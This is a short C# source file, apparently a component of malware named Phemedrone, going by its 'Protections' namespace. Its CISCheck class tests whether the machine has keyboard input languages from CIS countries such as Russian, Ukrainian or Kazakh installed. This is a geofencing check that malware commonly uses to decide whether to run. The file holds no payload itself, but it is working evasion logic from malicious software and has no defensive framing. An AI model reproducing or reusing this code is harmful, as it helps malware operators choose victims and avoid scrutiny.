﻿using System;
using System.Globalization;
using System.Linq;
using System.Windows.Forms;

namespace Phemedrone.Protections
{
    public class CISCheck
    {
        public static bool IsCIS()
        {
            var languages = InputLanguage.InstalledInputLanguages;
            var desiredCultures = new CultureInfo[]
            {
                new CultureInfo("ru-RU"),
                new CultureInfo("uk-UA"),
                new CultureInfo("kk-KZ"),
                new CultureInfo("ro-MD"),
                new CultureInfo("uz-UZ"),
                new CultureInfo("be-BY"),
                new CultureInfo("az-Latn-AZ"),
                new CultureInfo("hy-AM"),
                new CultureInfo("ky-KG"),
                new CultureInfo("tg-Cyrl-TJ")
            };

            return languages.Cast<InputLanguage>().Any(language => Array.Exists(desiredCultures, culture => culture.Equals(language.Culture)));
        }
    }
}